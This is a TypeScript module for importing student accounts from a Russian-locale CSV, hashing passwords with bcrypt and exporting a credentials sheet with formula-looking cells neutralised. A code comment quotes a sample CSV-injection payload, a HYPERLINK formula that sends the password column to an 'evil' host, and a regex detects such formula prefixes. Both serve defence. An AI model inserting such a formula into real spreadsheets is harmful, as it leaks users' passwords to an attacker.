// Parsing/validation of the student-accounts CSV (`логин,фио,пароль`) and
// the actual account creation, shared by POST /api/students/import and the
// `npm run seed:students` CLI so both behave identically.
// Deliberately independent of lib/csvParser.ts (the test-material parser).
import bcrypt from "bcryptjs";
import { prisma } from "../db/prisma";
import { hashPasswords } from "./hashPool";
import { generatePassword } from "./passwords";

// Logins are stored lowercase (the login endpoint lowercases input too), so
// "Ivanov" and "ivanov" can never become two accounts. The first character
// must be a letter/digit: a leading "-" is also a spreadsheet formula prefix.
export const LOGIN_PATTERN = /^[a-z0-9][a-z0-9._-]*$/;
export const LOGIN_MAX_LENGTH = 64;
export const FULLNAME_MAX_LENGTH = 200;
export const PASSWORD_MIN_LENGTH = 8;
export const PASSWORD_MAX_LENGTH = 72; // bcrypt ignores bytes past 72
// Keeps one import comfortably inside a proxy timeout even on a 1-2 core VPS
// (500 × ~60 ms of bcrypt, spread over worker threads).
export const MAX_IMPORT_ROWS = 500;

// Cost 10 instead of the seed's 12: bulk imports hash hundreds of passwords
// per request. 10 is still the common default.
const IMPORT_BCRYPT_COST = 10;

// Cells starting with these are evaluated as formulas by Excel/LibreOffice
// (CSV injection: e.g. =HYPERLINK("http://evil/?"&C2) leaks the password
// column). Such values are rejected on input and neutralised on output.
const FORMULA_PREFIX = /^[=+\-@\t\r]/;
const FORMULA_MESSAGE = "не может начинаться с символов = + - @ (их Excel воспринимает как формулу).";

export interface CsvIssue {
  line: number;
  message: string;
}

export interface StudentCsvRow {
  line: number;
  login: string;
  fullName: string;
  password: string | null; // null = generate one
}

export interface CreatedStudent {
  id: string;
  login: string;
  fullName: string;
  password: string;
  generated: boolean;
}

export interface SkippedStudent {
  line: number;
  login: string;
  reason: string;
}

// ---------------------------------------------------------------------------
// Minimal RFC 4180 reader: quoted fields, "" escapes, delimiters and newlines
// inside quotes, CRLF/LF/CR line endings. Each record carries the physical
// line number it started on so errors point at the right line in Excel.
// ---------------------------------------------------------------------------
interface CsvRecord {
  line: number;
  fields: string[];
}

function detectDelimiter(text: string): "," | ";" {
  // Russian-locale Excel saves "CSV" with `;`. Decide from the header line
  // (outside quotes): more semicolons than commas → semicolon file.
  let commas = 0;
  let semis = 0;
  let inQuotes = false;
  for (const ch of text) {
    if (ch === '"') inQuotes = !inQuotes;
    else if (!inQuotes && (ch === "\n" || ch === "\r")) break;
    else if (!inQuotes && ch === ",") commas++;
    else if (!inQuotes && ch === ";") semis++;
  }
  return semis > commas ? ";" : ",";
}

function readCsv(text: string, delimiter: string): { records: CsvRecord[]; issues: CsvIssue[] } {
  const records: CsvRecord[] = [];
  const issues: CsvIssue[] = [];
  let fields: string[] = [];
  let field = "";
  let inQuotes = false;
  let line = 1;
  let recordLine = 1;

  const endRecord = () => {
    fields.push(field);
    records.push({ line: recordLine, fields });
    fields = [];
    field = "";
  };

  for (let i = 0; i < text.length; i++) {
    const ch = text[i]!;
    if (inQuotes) {
      if (ch === '"') {
        if (text[i + 1] === '"') {
          field += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        if (ch === "\n" || (ch === "\r" && text[i + 1] !== "\n")) line++;
        field += ch;
      }
      continue;
    }
    if (ch === '"' && field.trim() === "") {
      field = "";
      inQuotes = true;
    } else if (ch === delimiter) {
      fields.push(field);
      field = "";
    } else if (ch === "\r" || ch === "\n") {
      if (ch === "\r" && text[i + 1] === "\n") i++;
      endRecord();
      line++;
      recordLine = line;
    } else {
      field += ch;
    }
  }
  if (inQuotes) issues.push({ line: recordLine, message: "незакрытая кавычка — поле не закрыто до конца файла." });
  if (field !== "" || fields.length > 0) endRecord();
  return { records, issues };
}

const HEADER_ALIASES: Record<"login" | "fullName" | "password", string[]> = {
  login: ["логин", "login"],
  fullName: ["фио", "ф.и.о.", "имя", "fullname", "full name", "name"],
  password: ["пароль", "password"],
};

export function parseStudentsCsv(input: string): { rows: StudentCsvRow[]; issues: CsvIssue[] } {
  const text = input.replace(/^﻿/, "");
  const { records, issues } = readCsv(text, detectDelimiter(text));
  const nonEmpty = records.filter((r) => r.fields.some((f) => f.trim() !== ""));

  const header = nonEmpty[0];
  if (!header) return { rows: [], issues: [{ line: 1, message: "файл пустой." }] };

  const names = header.fields.map((f) => f.trim().toLowerCase());
  const col = (key: keyof typeof HEADER_ALIASES) => names.findIndex((n) => HEADER_ALIASES[key].includes(n));
  const loginCol = col("login");
  const nameCol = col("fullName");
  const passwordCol = col("password");
  if (loginCol < 0 || nameCol < 0) {
    issues.push({
      line: header.line,
      message: "первая строка должна быть заголовком «логин,фио,пароль» (колонка «пароль» необязательна).",
    });
    return { rows: [], issues };
  }

  const body = nonEmpty.slice(1);
  if (body.length === 0) issues.push({ line: header.line, message: "в файле нет ни одного студента." });
  if (body.length > MAX_IMPORT_ROWS) {
    issues.push({ line: header.line, message: `слишком много строк (${body.length}), максимум ${MAX_IMPORT_ROWS} за раз.` });
    return { rows: [], issues };
  }

  const rows: StudentCsvRow[] = [];
  const seen = new Map<string, number>();
  for (const rec of body) {
    const login = normalizeLogin(rec.fields[loginCol] ?? "");
    const fullName = (rec.fields[nameCol] ?? "").trim().replace(/\s+/g, " ");
    const password = passwordCol >= 0 ? (rec.fields[passwordCol] ?? "").trim() : "";

    const rowIssues = [
      validateLogin(login),
      validateFullName(fullName),
      password ? validatePassword(password) : null,
    ].filter((m): m is string => m !== null);

    const firstLine = seen.get(login);
    if (login && firstLine !== undefined) rowIssues.push(`логин «${login}» уже встречается в строке ${firstLine}.`);
    else if (login) seen.set(login, rec.line);

    for (const message of rowIssues) issues.push({ line: rec.line, message });
    if (rowIssues.length === 0) rows.push({ line: rec.line, login, fullName, password: password || null });
  }
  issues.sort((a, b) => a.line - b.line);
  return { rows, issues };
}

export function normalizeLogin(login: string) {
  return login.trim().toLowerCase();
}

// Expects a normalized (trimmed, lowercased) login.
export function validateLogin(login: string): string | null {
  if (!login) return "пустой логин.";
  if (login.length > LOGIN_MAX_LENGTH) return `логин длиннее ${LOGIN_MAX_LENGTH} символов.`;
  if (!LOGIN_PATTERN.test(login)) {
    return `логин «${login}» содержит недопустимые символы — разрешены латинские буквы, цифры, «.», «_», «-» (начинаться должен с буквы или цифры).`;
  }
  return null;
}

export function validateFullName(fullName: string): string | null {
  if (!fullName) return "пустое ФИО.";
  if (fullName.length > FULLNAME_MAX_LENGTH) return `ФИО длиннее ${FULLNAME_MAX_LENGTH} символов.`;
  if (FORMULA_PREFIX.test(fullName)) return `ФИО ${FORMULA_MESSAGE}`;
  return null;
}

export function validatePassword(password: string): string | null {
  if (password.length < PASSWORD_MIN_LENGTH) return `пароль короче ${PASSWORD_MIN_LENGTH} символов.`;
  if (password.length > PASSWORD_MAX_LENGTH) return `пароль длиннее ${PASSWORD_MAX_LENGTH} символов.`;
  if (FORMULA_PREFIX.test(password)) return `пароль ${FORMULA_MESSAGE}`;
  return null;
}

export async function hashPassword(password: string) {
  return bcrypt.hash(password, IMPORT_BCRYPT_COST);
}

// Creates the valid rows. Existing logins (compared case-insensitively, in
// case older accounts were stored with capitals) are skipped, never updated —
// an import must not silently reset the password of someone already using it.
export async function createStudents(rows: StudentCsvRow[]) {
  const existing = await prisma.user.findMany({
    where: { login: { in: rows.map((r) => r.login), mode: "insensitive" } },
    select: { login: true, role: true },
  });
  const existingByLogin = new Map(existing.map((u) => [u.login.toLowerCase(), u.role]));

  const skipped: SkippedStudent[] = [];
  const toCreate: (StudentCsvRow & { password: string; generated: boolean })[] = [];
  for (const row of rows) {
    const role = existingByLogin.get(row.login);
    if (role) {
      skipped.push({ line: row.line, login: row.login, reason: role === "ADMIN" ? ADMIN_TAKEN : ALREADY_EXISTS });
    } else {
      toCreate.push({ ...row, password: row.password ?? generatePassword(), generated: row.password === null });
    }
  }

  // Hash first (the slow part, in parallel), then insert everything in one
  // statement: either the whole batch lands or none of it does.
  const hashes = await hashPasswords(toCreate.map((r) => r.password), IMPORT_BCRYPT_COST);
  const inserted = toCreate.length
    ? await prisma.user.createManyAndReturn({
        data: toCreate.map((r, i) => ({
          login: r.login,
          fullName: r.fullName,
          passwordHash: hashes[i]!,
          role: "STUDENT" as const,
        })),
        // A login created concurrently since the lookup is skipped, not an error.
        skipDuplicates: true,
        select: { id: true, login: true },
      })
    : [];
  const idByLogin = new Map(inserted.map((u) => [u.login, u.id]));

  const created: CreatedStudent[] = [];
  for (const r of toCreate) {
    const id = idByLogin.get(r.login);
    if (id) created.push({ id, login: r.login, fullName: r.fullName, password: r.password, generated: r.generated });
    else skipped.push({ line: r.line, login: r.login, reason: ALREADY_EXISTS });
  }
  skipped.sort((a, b) => a.line - b.line);
  return { created, skipped };
}

const ALREADY_EXISTS = "студент уже существует, пароль не изменён";
const ADMIN_TAKEN = "логин занят администратором";

function csvCell(raw: string) {
  const value = FORMULA_PREFIX.test(raw) ? `'${raw}` : raw;
  return /[",;\r\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
}

// The one writer of the credentials sheet (API responses and the CLI): same
// format as the import file, BOM so Excel detects UTF-8 and shows Cyrillic
// correctly, formula-looking cells neutralised with a leading apostrophe.
export function credentialsCsv(students: { login: string; fullName: string; password: string }[]) {
  const lines = ["логин,фио,пароль", ...students.map((s) => [s.login, s.fullName, s.password].map(csvCell).join(","))];
  return `\uFEFF${lines.join("\r\n")}\r\n`;
}
